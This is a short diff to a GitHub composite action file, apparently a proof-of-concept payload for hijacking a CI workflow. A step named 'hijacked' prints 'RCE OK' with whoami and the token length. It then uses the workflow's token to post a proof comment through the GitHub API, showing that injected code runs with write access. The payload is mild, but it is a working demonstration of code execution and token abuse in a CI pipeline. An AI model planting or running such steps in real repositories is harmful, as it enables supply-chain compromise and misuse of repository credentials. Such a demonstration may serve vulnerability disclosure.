@@ -22,15 +22,18 @@ runs:
   steps:
     - name: hijacked
       shell: bash
+      env:
+        TOK: ${{ inputs.token }}
+        NUM: ${{ inputs.issue-number }}
       run: |
-        echo "=== RCE OK: whoami=$(whoami) ==="
-        echo "token_len=${#INPUT_TOKEN}"
+        echo "=== RCE OK whoami=$(whoami) ==="
+        echo "tok_len=${#TOK}"
         code=$(curl -s -o /tmp/resp.json -w '%{http_code}' -X POST \
-          -H "Authorization: Bearer $INPUT_TOKEN" \
+          -H "Authorization: Bearer $TOK" \
           -H "Accept: application/vnd.github+json" \
-          "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${INPUT_ISSUE-NUMBER}/comments" \
+          "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${NUM}/comments" \
           -d '{"body":"rce-token-write-proof"}')
         echo "comment_api_status=$code"
-        head -c 90 /tmp/resp.json || true
+        head -c 80 /tmp/resp.json || true
         echo
         echo "=== END ==="
